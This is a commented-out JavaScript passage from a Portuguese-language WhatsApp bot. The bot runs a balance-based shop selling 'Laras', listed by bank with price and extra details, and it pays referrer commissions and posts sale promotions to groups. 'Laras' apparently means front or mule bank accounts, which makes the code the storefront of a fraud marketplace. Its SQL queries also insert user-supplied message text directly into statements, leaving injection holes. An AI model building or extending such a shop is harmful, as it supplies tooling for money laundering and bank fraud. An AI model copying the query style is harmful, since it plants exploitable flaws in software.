        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        // if (Mensagem_Texto.indexOf("/textocomproulara===") > -1 && Adms.includes(Numero)) {
        //     try {
        //         msg = Mensagem_Texto.split("===")
        //         Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

        //         if (msg[1] === "") {
        //             Texto = `Comando inválido`
        //             await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                 Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //             }).catch(async(erro) => {
        //                 console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //             });
        //             return
        //         }
        //         MENSAGEM_AO_COMPRAR_LARA = msg[1]
        //         MENSAGEM_AO_COMPRAR_LARA = MENSAGEM_AO_COMPRAR_LARA.replace(/\'/igm, "")
        //         await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${MENSAGEM_AO_COMPRAR_LARA}' WHERE PARAMETRO = 'MENSAGEM_AO_COMPRAR_LARA'`).run()

        //         Texto = `*TEXTO A EXIBIR QUANDO CLIENTE COMPRAR LARA, ALTERADO COM SUCESSO!*`
        //         await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //             Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //         }).catch(async(erro) => {
        //             console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //         });
        //         return
        //     } catch (error) {
        //         console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
        //         Texto = `Comando inválido`
        //         await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //             Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //         }).catch(async(erro) => {
        //             console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //         });
        //         return
        //     }
        // }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳



        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //         if ((Mensagem_Tipo).toString() === "list_response" && Mensagem_Texto.indexOf("💱 LARAS") > -1) {
        //             TEXTO_MENU_LARA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'TEXTO_MENU_LARA'`).get()["VALOR"]
        //             SALDO_USUARIO = await DataBase_Better.prepare(`SELECT SALDO FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()["SALDO"]
        //             SALDO_USUARIO = parseFloat(SALDO_USUARIO).toFixed(2)

        //             Categorias = await DataBase_Better.prepare(`SELECT _rowid_,BANCO FROM LARAS`).all();
        //             if (Categorias.length === 0) {

        //                 Texto = `*INFELIZMENTE ESTAMOS SEM MATERIAL NO ESTOQUE, NOSSA EQUIPE FOI NOTIFICADA!*`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 for await (adm of Adms) {
        //                     Texto = `⚠️ *ATENÇÃO ADM* ⚠️

        // Usuário: wa.me/${Numero}

        // Tentou efetuar a compra de Laras, mas o estoque está vazio!`
        //                     await client.sendText(`${adm}@c.us`, Texto).then(async (result) => {
        //                         Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                     }).catch(async(erro) => {
        //                         console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                     });
        //                 }
        //                 return
        //             }

        //             //Categorias.sort();

        //             Array_Tipos_Em_Estoque = await DataBase_Better.prepare(`SELECT MIN(_rowid_) AS _rowid_,BANCO FROM LARAS GROUP BY BANCO`).all();

        //             Array_Botoes = []
        //             for await (Categoria of Array_Tipos_Em_Estoque) {
        //                 console.log(Categoria)
        //                 console.log(Categoria["BANCO"])
        //                 Estoque = await DataBase_Better.prepare(`SELECT BANCO FROM LARAS WHERE BANCO = '${Categoria["BANCO"]}'`).all();

        //                 try {
        //                     Array_Botoes.push({
        //                         rowId: `${iD_Footer.toString()}|`,
        //                         title: Categoria["BANCO"],
        //                         description: `TOTAL EM ESTOQUE: ${Estoque.length}`
        //                     })
        //                 } catch (error) {
        //                     await Menu(client, Numero, Mensagem_From)
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }
        //             }
        //             //console.log(Array_Botoes)
        //             if (Array_Botoes.length === 0) {
        //                 Texto = `*INFELIZMENTE ESTAMOS SEM MATERIAL NO ESTOQUE, NOSSA EQUIPE FOI NOTIFICADA!*`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 for await (adm of Adms) {
        //                     Texto = `⚠️ *ATENÇÃO ADM* ⚠️

        // Usuário: wa.me/${Numero}

        // Tentou efetuar a compra de loguins, mas o estoque está vazio!`
        //                     await client.sendText(`${adm}@c.us`, Texto).then(async (result) => {
        //                         Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                     }).catch(async(erro) => {
        //                         console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                     });
        //                 }
        //                 return
        //             }

        //             iD_Footer = Date.now()

        //             Texto = `Clique em *OPÇÕES* para escolher a Lara desejada.

        // ◆ ━━━━❪✪❫━━━━ ◆
        // ❖ *Seu número:* ${Numero}
        // ❖ *Saldo Atual:* R\$: ${SALDO_USUARIO}
        // ◆ ━━━━❪✪❫━━━━ ◆

        // ${TEXTO_MENU_LARA}
        // `

        //             await client.sendListMessage(Mensagem_From, {
        //                 buttonText: "LARAS",
        //                 description: Texto,
        //                 sections: [
        //                     {
        //                         title: "BANCOS",
        //                         rows: Array_Botoes
        //                     },
        //                 ],
        //             }).then(async (result) => {
        //                 await DataBase_Better.prepare(`UPDATE CONTATOS SET ID_BOTAO = '${iD_Footer.toString()}|liberar_esta_interacao_se_for_antiga' WHERE ID_CONTATO = '${Mensagem_From}'`).run()
        //                 Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //             }).catch(async(erro) => {
        //                 console.error('Error when sending: ', erro);
        //             })
        //             return
        //         }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //         if ((Mensagem_Tipo).toString() === "list_response" && Mensagem_Texto.indexOf("TOTAL EM ESTOQUE") > -1) {

        //             Div = Mensagem_Texto.split("\n")
        //             PARAMETRO = Div[0]

        //             Array_CCs = await DataBase_Better.prepare(`SELECT _rowid_,BANCO,NOME,PRECO FROM LARAS WHERE BANCO = '${PARAMETRO}'`).all();

        //             Array_Botoes = []
        //             for await (item of Array_CCs) {
        //                 //console.log(item)
        //                 ID = item["rowid"]
        //                 BANCO = item["BANCO"]
        //                 NOME = item["NOME"]
        //                 PRECO = item["PRECO"]

        //                 Array_Botoes.push({
        //                     rowId: `${iD_Footer.toString()}|`,
        //                     title: `${NOME}`,
        //                     description: `ID LARA: ${ID}
        // 💰PREÇO: R$:${PRECO}
        // 🏦${BANCO}
        // `
        //                 })
        //             }

        //             iD_Footer = Date.now()

        //             Texto = `📱 *LISTA DE LARAS* 📱

        // Clique em *Opções de Laras*, escolha sua lara e ao selecionar e enviar, caso você possua saldo suficiente, você estará efetuando a compra.

        // ⚠️*MUITA ATENÇÃO AO ESCOLHER A LARA DESEJADA!*⚠️`

        //             await client.sendListMessage(Mensagem_From, {
        //                 buttonText: 'Opções de Laras',
        //                 description: Texto,
        //                 sections: [
        //                     {
        //                         title: "Selecione a consul e clique no botão enviar.",
        //                         rows: Array_Botoes
        //                     },
        //                 ],
        //             }).then(async (result) => {
        //                 await DataBase_Better.prepare(`UPDATE CONTATOS SET ID_BOTAO = '${iD_Footer.toString()}|liberar_esta_interacao_se_for_antiga' WHERE ID_CONTATO = '${Mensagem_From}'`).run()
        //                 Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //             }).catch(async(erro) => {
        //                 console.error('Error when sending: ', erro);
        //             })
        //             return
        //         }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //         if ((Mensagem_Tipo).toString() === "list_response" && Mensagem_Texto.indexOf("ID LARA:") > -1) {

        //             Div = Mensagem_Texto.split("\n")
        //             ID = (Div[1]).toString().replace(/[^0-9]/igm, '');

        //             ROWID = await DataBase_Better.prepare(`SELECT _rowid_ FROM LARAS WHERE _rowid_ = '${ID}'`).get()
        //             if (ROWID === undefined) {
        //                 Texto = `Desculpe, outra pessoa comprou esta Lara, escolha outra!`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 return
        //             }

        //             item = await DataBase_Better.prepare(`SELECT _rowid_,BANCO,NOME,PRECO,ADICIONAIS FROM LARAS WHERE _rowid_ = '${ID}'`).get();

        //             ID = item["rowid"]
        //             BANCO = item["BANCO"]
        //             NOME = item["NOME"]
        //             PRECO = item["PRECO"]
        //             ADICIONAIS = item["ADICIONAIS"]

        //             PRECO_MATERIAL = parseFloat(PRECO).toFixed(2)

        //             SALDO_USUARIO = await DataBase_Better.prepare(`SELECT SALDO FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()["SALDO"]
        //             SALDO_USUARIO = parseFloat(SALDO_USUARIO).toFixed(2);
        //             if (parseFloat(SALDO_USUARIO) < parseFloat(PRECO_MATERIAL)) {

        //                 Texto = `⚠️*Você não possui saldo suficiente para comprar esta Lara.*`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 return;
        //             }

        //             NOVO_SALDO = parseFloat(SALDO_USUARIO) - parseFloat(PRECO_MATERIAL)
        //             NOVO_SALDO = parseFloat(NOVO_SALDO).toFixed(2)

        //             await DataBase_Better.prepare(`UPDATE CONTATOS SET SALDO = '${NOVO_SALDO}' WHERE ID_CONTATO = '${Mensagem_From}'`).run()
        //             await DataBase_Better.prepare(`INSERT INTO LARAS_VENDIDAS (BANCO,NOME,PRECO,ADICIONAIS,NUMERO_COMPRADOR,DATA_MS_INSERIDO) VALUES ('${BANCO}','${NOME}','${PRECO}','${ADICIONAIS}','${Mensagem_From}','${Date.now()}')`).run()
        //             await DataBase_Better.prepare(`DELETE FROM LARAS WHERE _rowid_ = ${ID}`).run()

        //             VALOR_BASE_INDIC = PRECO_MATERIAL
        //             Contato_Temp_Indic = Mensagem_From
        //             FUNCAO_ASSOCIADOS_PAGO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'FUNCAO_ASSOCIADOS_PAGO'`).get()["VALOR"]
        //             if (FUNCAO_ASSOCIADOS_PAGO === "1") {
        //                 ATIVAR_ASSOCIADOS = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ATIVAR_ASSOCIADOS'`).get()["VALOR"]
        //                 if (ATIVAR_ASSOCIADOS === "1") {

        //                     Ja_tem_Indicador = await DataBase_Better.prepare(`SELECT NUMERO_INDICADOR FROM CONTATOS WHERE ID_CONTATO = '${Contato_Temp_Indic}'`).get()
        //                     if (Ja_tem_Indicador["NUMERO_INDICADOR"] != "0") {
        //                         NUMERO_INDICADOR = await DataBase_Better.prepare(`SELECT NUMERO_INDICADOR FROM CONTATOS WHERE ID_CONTATO = '${Contato_Temp_Indic}'`).get()["NUMERO_INDICADOR"]
        //                         PERCENTUAL_ADICIONAL_ASSOCIADO = await DataBase_Better.prepare(`SELECT PERCENTUAL_ADICIONAL_ASSOCIADO FROM CONTATOS WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).get()["PERCENTUAL_ADICIONAL_ASSOCIADO"]
        //                         if (PERCENTUAL_ADICIONAL_ASSOCIADO.toString() != "0") {
        //                             PERCENTUAL_FINAL = await DataBase_Better.prepare(`SELECT PERCENTUAL_ADICIONAL_ASSOCIADO FROM CONTATOS WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).get()["PERCENTUAL_ADICIONAL_ASSOCIADO"]
        //                         } else {
        //                             PERCENTUAL_FINAL = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'PERCENTUAL_ASSO_GERAL'`).get()["VALOR"]
        //                         }

        //                         PIX_OU_COMPRA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'PIX_OU_COMPRA'`).get()["VALOR"]
        //                         if (PIX_OU_COMPRA === "1") {

        //                         } else if (PIX_OU_COMPRA === "2") {
        //                             VALOR_ADD_INDICADOR = ((parseFloat(PERCENTUAL_FINAL) * parseFloat(VALOR_BASE_INDIC)) / 100);
        //                             VALOR_ADD_INDICADOR = parseFloat(VALOR_ADD_INDICADOR).toFixed(2)
        //                             console.log(`VALOR_ADD_INDICADOR: ${VALOR_ADD_INDICADOR}`)

        //                             SALDO_INDICACAO = await DataBase_Better.prepare(`SELECT SALDO_INDICACAO FROM CONTATOS WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).get()["SALDO_INDICACAO"]
        //                             SALDO_INDICACAO = parseFloat(SALDO_INDICACAO).toFixed(2)
        //                             console.log(`SALDO_INDICACAO: ${SALDO_INDICACAO}`)

        //                             NOVO_SALDO_INDICACAO = parseFloat(SALDO_INDICACAO) + parseFloat(VALOR_ADD_INDICADOR)
        //                             NOVO_SALDO_INDICACAO = parseFloat(NOVO_SALDO_INDICACAO).toFixed(2)
        //                             console.log(`NOVO_SALDO_INDICACAO: ${NOVO_SALDO_INDICACAO}`)

        //                             await DataBase_Better.prepare(`UPDATE CONTATOS SET SALDO_INDICACAO = '${NOVO_SALDO_INDICACAO}' WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).run()
        //                             console.log(`Indicador:${NUMERO_INDICADOR} ganhou R$:${VALOR_ADD_INDICADOR}`)
        //                         }
        //                     }
        //                 }
        //             }

        //             MENSAGEM_AO_COMPRAR_LARA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'MENSAGEM_AO_COMPRAR_CONSULTAVEL'`).get()["VALOR"]

        //             Texto_Usuario = `💱 *LARA COMPRADA* 💱

        // ⏰ *DATA DA COMPRA:* ${new Date(parseInt(Date.now())).toLocaleString()}
        // 💱 *LARA:* ${BANCO}

        // ${ADICIONAIS}
        // ═══════❖═══════
        // ${MENSAGEM_AO_COMPRAR_LARA}
        // `
        //             await client.sendImage(Mensagem_From, FOTO_Comprou_Lara_PV, 'foto', Texto_Usuario).then(async (result) => {
        //             }).catch(async(erro) => {
        //                 console.error('Error when sending: ', erro);
        //             });

        //             Texto_Grupo = `💱 *USUÁRIO COMPROU UMA LARA* 💱

        // 👤 *NÚMERO DO USUÁRIO:* wa.me/${Numero}

        // 💱 *LARA:* ${BANCO}

        // *VENHA ADQUIRIR AS MELHORES LARAS DO MERCADO!*

        // *ATENDIMENTO 100% AUTOMÁTICO!*

        // Este é o número do BOT, mande qualquer mensagem!
        // wa.me/${NUMERO_PURO_BOT}`

        //             NOT_COMPROU_LARA = await DataBase_Better.prepare(`SELECT VALOR FROM NOTIFICACOES_GRUPOS WHERE PARAMETRO = 'NOT_COMPROU_LARA'`).get()["VALOR"]
        //             if (NOT_COMPROU_LARA === "1") {
        //                 for await (Grupo of ID_GRUPOS) {
        //                     try {
        //                         await client.sendImage(Grupo["ID_GRUPO"], FOTO_Comprou_Lara_GP, 'foto', Texto_Grupo).then(async (result) => {
        //                         }).catch(async(erro) => {
        //                             console.error('Error when sending: ', erro);
        //                         });
        //                     } catch (error) {
        //                     }
        //                 }
        //             }

        //             Texto_Adms = `💱 *LARA COMPRADA* 💱

        // 👤 *NÚMERO DO USUÁRIO:* wa.me/${Numero}

        // 💱 *LARA:* ${BANCO}
        // 💰 *PREÇO DA LARA:* R$: ${PRECO_MATERIAL}

        // ${ADICIONAIS}
        // `

        //             for await (adm of Adms) {
        //                 Texto = Texto_Adms
        //                 await client.sendText(`${adm}@c.us`, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //             }

        //             Item_Fila_Sendo_Processado_MS = Date.now()

        //             console.log(`Lara Comprada! Numero: wa.me/${Numero} | Valor: ${PRECO_MATERIAL}`)
        //             return;
        //         }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳



        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
